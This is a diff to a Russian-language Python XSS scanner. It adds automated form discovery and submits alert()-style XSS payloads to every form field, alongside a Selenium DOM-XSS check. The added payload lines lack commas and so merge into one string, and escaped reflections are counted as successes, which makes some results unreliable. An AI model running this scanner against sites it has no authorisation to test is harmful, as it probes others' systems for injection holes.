@@ -8,6 +8,7 @@ from selenium.webdriver.firefox.options import Options
 import webbrowser
 import os
 import random
+from bs4 import BeautifulSoup
 
 resultjson = []
 
@@ -28,6 +29,9 @@ dom_payload = [
 ]
 
 payloads = [
+    "<svg/onload=alert(1)>"
+    "<img src=x onerror=alert(1)>"
+    "<script>alert(1)</script>"
     "<script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
     "<svg onload=alert('XSS')>",
@@ -90,13 +94,65 @@ def vibor():
     choice = input(": ").strip()
     return choice
 
-def test_dom_xss(base_url, dom_payloads, resultjson):
+def scan_form_xss(base_url, payloads, resultjson):
+    print("\nПроверка XSS через формы:")
+
+    try:
+        response = requests.get(base_url, headers=headers, timeout=10)
+        soup = BeautifulSoup(response.text, "html.parser")
+        forms = soup.find_all("form")
+        print(f"Найдено форм: {len(forms)}")
+
+        for form in forms:
+            action = form.get("action")
+            method = form.get("method", "get").lower()
+            full_url = urllib.parse.urljoin(base_url, action)
+
+            inputs = form.find_all(["input", "textarea", "select"])
+            input_names = [i.get("name") for i in inputs if i.get("name")]
+
+            if not input_names:
+                continue
+
+            for payload in payloads:
+                data = {name: payload for name in input_names}
+
+                try:
+                    if method == "post":
+                        form_response = requests.post(full_url, data=data, headers=headers, timeout=10)
+                    else:
+                        form_response = requests.get(full_url, params=data, headers=headers, timeout=10)
+
+                    raw = payload in form_response.text
+                    escaped = html.escape(payload) in form_response.text
+                    worked = raw or escaped
+                    status = "отражён как есть" if raw else "экранирован" if escaped else "не отражён"
+
+                    print(f"{'сработал' if worked else 'не сработал'} ({status}) {payload} -> {full_url}")
+
+                    resultjson.append({
+                        "payload": payload,
+                        "worked": worked,
+                        "url": full_url,
+                        "method": method.upper(),
+                        "status_code": form_response.status_code,
+                        "via": "form"
+                    })
+
+                except Exception as e:
+                    print(f"[!] Ошибка при отправке формы: {e}")
+
+    except Exception as e:
+        print(f"[!] Ошибка при анализе формы: {e}")
+
+
+def test_dom_xss(base_url, payloads, resultjson):
     print("\nПроверка на DOM-based XSS (Selenium):")
     options = Options()
     options.add_argument("--headless")
     driver = webdriver.Firefox(options=options)
 
-    for payload in dom_payloads:
+    for payload in payloads:
         try:
             full_url = base_url + payload
             driver.get(full_url)
@@ -108,7 +164,7 @@ def test_dom_xss(base_url, dom_payloads, resultjson):
             except:
                 pass
 
-            print(f"{'сработал' if alert else 'не сработал'} {payload}")
+            print(f"{'[+] сработал' if alert else 'не сработал'} {payload}")
 
             result_entry = {
                 "payload": payload,
@@ -131,56 +187,10 @@ if method not in ["GET", "POST"]:
     method = "GET"
 
 url = input("Введите url (например, https://example.com): ").strip()
-def get_param():
-    print("\n1 - Ввести имя параметра вручную")
-    print("2 - Выбрать из популярных имён параметров")
-    choice = input("Выбор: ").strip()
 
-    if choice == "2":
-        preset_params = ["q", "search", "query", "s", "input"]
-        for i, p in enumerate(preset_params, 1):
-            print(f"{i}: {p}")
-        try:
-            idx = int(input("Выбери номер: ").strip())
-            return preset_params[idx - 1]
-        except (ValueError, IndexError):
-            print("Неверный выбор, будет 'q' по умолчанию.")
-            return "q"
-    else:
-        return input("Введите имя параметра (например, q): ").strip()
+scan_form_xss(url, payloads, resultjson)
 
-param = get_param()
-
-print("\nПроверка на XSS")
-
-for payload in payloads:
-    try:
-        if method == "POST":
-            test_url = url
-            response = requests.post(test_url, headers=headers, data={param: payload})
-        else:
-            encoded_payload = urllib.parse.quote(payload)
-            test_url = f"{url}?{param}={encoded_payload}"
-            response = requests.get(test_url, headers=headers)
-
-        raw = payload in response.text
-        escaped = html.escape(payload) in response.text
-        worked = raw or escaped
-        status = "отражён как есть" if raw else "экранирован" if escaped else "не отражён"
-        print(f"{'сработал' if worked else 'не сработал'} ({status}) {payload}")
-
-        result_entry = {
-            "payload": payload,
-            "worked": worked,
-            "url": test_url,
-            "status_code": response.status_code
-        }
-        resultjson.append(result_entry)
-
-    except Exception as e:
-        print(f"ошибка {e}")
-
-test_dom_xss(url, dom_payload, resultjson)
+test_dom_xss(url, payloads, resultjson)
 
 if save_format == "1":
     with open(os.path.join(folder_path, f"{filename}.txt"), "w", encoding="utf-8") as f:
@@ -188,8 +198,9 @@ if save_format == "1":
             f.write(f"{'сработал' if entry['worked'] else 'не сработал'} {entry['payload']}\n")
 
 elif save_format == "2":
-    with open(os.path.join(folder_path, f"{filename}.json"), "w", encoding="utf-8") as jf:
-        json.dump(resultjson, jf, ensure_ascii=False, indent=4)
+    with open(f"{folder_path}/{filename}.json", "w", encoding="utf-8") as f:
+        json.dump(resultjson, f, ensure_ascii=False, indent=4)
+
 
 elif save_format == "3":
     html_content = """
